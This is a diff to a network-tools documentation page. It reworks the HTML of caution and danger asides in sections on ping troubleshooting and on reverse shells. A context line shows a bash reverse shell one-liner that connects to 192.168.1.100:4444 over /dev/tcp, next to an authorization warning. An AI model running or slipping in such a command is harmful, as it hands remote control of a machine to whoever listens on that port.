@@ -158,7 +158,7 @@ ping -c 1 -t 1 8.8.8.8  # Will fail with "Time to live exceeded"
 2. **Destination Host Unreachable:** The local router cannot reach the destination network.
 3. **Permission Denied:** Requires root for raw ICMP sockets, or the binary is not installed.
 
-<aside aria-label="Do not assume a host is down just because ping fails. Many networks block ICMP at firewalls. Use" class="starlight-aside starlight-aside--caution"><p class="starlight-aside__title" aria-hidden="true"><svg class="starlight-aside__icon" aria-hidden="true" width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2L1 21h22L12 2Zm0 4l7.53 14H4.47L12 6Zm-1 5v4h2v-4h-2Zm0 6v2h2v-2h-2Z"/></svg>Do not assume a host is down just because ping fails. Many networks block ICMP at firewalls. Use</p>
+<aside class="starlight-aside starlight-aside--caution">
 `nc -zv` or `curl` to test TCP connectivity as an alternative. ICMP blocking is common in cloud
 Environments (AWS security groups do not allow ICMP by default).
 
@@ -496,7 +496,7 @@ bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
 ```
 
 </aside>
-<aside aria-label="Reverse shells and bind shells should only be used in authorized security testing environments." class="starlight-aside starlight-aside--danger"><p class="starlight-aside__title" aria-hidden="true"><svg class="starlight-aside__icon" aria-hidden="true" width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2Zm1 15h-2v-2h2v2Zm0-4h-2V7h2v6Z"/></svg>Reverse shells and bind shells should only be used in authorized security testing environments.</p>
+<aside class="starlight-aside starlight-aside--danger">
 Using them without authorization is illegal.
 
 
